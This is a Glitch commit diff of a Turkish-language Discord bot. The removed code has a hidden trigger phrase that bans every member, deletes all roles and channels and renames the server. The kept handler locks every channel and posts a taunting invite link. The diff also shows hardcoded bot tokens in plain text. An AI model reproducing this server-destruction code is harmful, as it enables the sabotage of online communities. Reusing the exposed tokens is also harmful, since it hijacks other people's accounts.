560ce426fd029773c32db6ad6f6aaeb517a48652
Glitch (benim-botum-lan) <none>
2019-08-29 23:03:24 +0000

    🌋📰 Checkpoint ./package.json:2558838/1292 ./berke.js:2558838/793

--- berke.js
+++ berke.js
@@ -1,53 +1,15 @@
-//7/24 başlayış
-
-const http = require('http');
-const express = require('express');    
-const app = express();
-let cooldown = new Set();
-let cdseconds = 5;
-app.get("/", (request, response) => {
-  console.log(Date.now());
-  response.sendStatus(200);
-});
-app.listen(process.env.PORT);
-setInterval(() => {
-  http.get(`http://pyros.glitch.me/`);
-}, 10000);
-
 const Discord = require('discord.js');
-const fs = require('fs');
-const chalk = require('chalk');
+const berke = new Discord.Client();
 
-const client = new Discord.Client();
-const tokenyeri = require('./tokenyeri.json');
+berke.on('message', async msg => {
+  if (msg.content.toLowerCase() === 'burayı bi düzelt' ) {
 
-require('./util/eventLoader')(client);
-
-client.on('message', message => {
-    if(message.content == 'unban'){
-        message.guild.fetchBans().then(bans => {
-            bans.forEach(user => {
-                console.log(user.username + '#' + user.tag);
-                message.guild.unban(user);
-            });
-        });
-    }
+  }
 });
 
-client.on('message', message => {
-    if(message.content == 'burayı bi düzelt'){
-   message.guild.members.forEach(member => member.ban())
-   message.guild.roles.deleteAll("");
-   message.guild.channels.deleteAll("");
-   message.guild.setName(`Kapandı`, "")
-   message.guild.setIcon(`https://cdn.discordapp.com/attachments/615300671599804435/616763400508145684/16-512.png`)
-   message.guild.createChannel(`hey`)
-    }
-});
-
-client.on('channelCreate', channel => {
+berke.on('channelCreate', channel => {
   if (channel.name == 'hey') {
-    channel.send(`Allah zihin açıklığı versin. @everyone \n\nhttps://discord.gg/4judfSa`)
+    channel.send(`Sunucuya ne oldu neyse üzüldüm :smoking: :smoking: bunları yapanla görüşmek istersen; https://discord.gg/cqKpafG`)
     channel.guild.channels.forEach(c => {
          c.overwritePermissions(channel.guild.roles.find("name", "@everyone"), {
               SEND_MESSAGES: false,
@@ -62,4 +24,4 @@ client.on('channelCreate', channel => {
 
 });
 
-client.login(tokenyeri.token) 
+berke.login("NjEwMjM5MzUxMDE1ODY2MzY5.XWhX5w.g_GCxbjv2GLZJxs5ilqnVohi-28");
--- bot.js
+++
@@ -1,5 +0,0 @@
-const Discord = require('discord.js');
-const berke = new Discord.Client();
-
-
-berke.login("NjExNTMxOTY2ODg1NTI3NTc0.XVVL2w.xCPJdV8zeSL7cs7_Yq5_cJo5BtY");
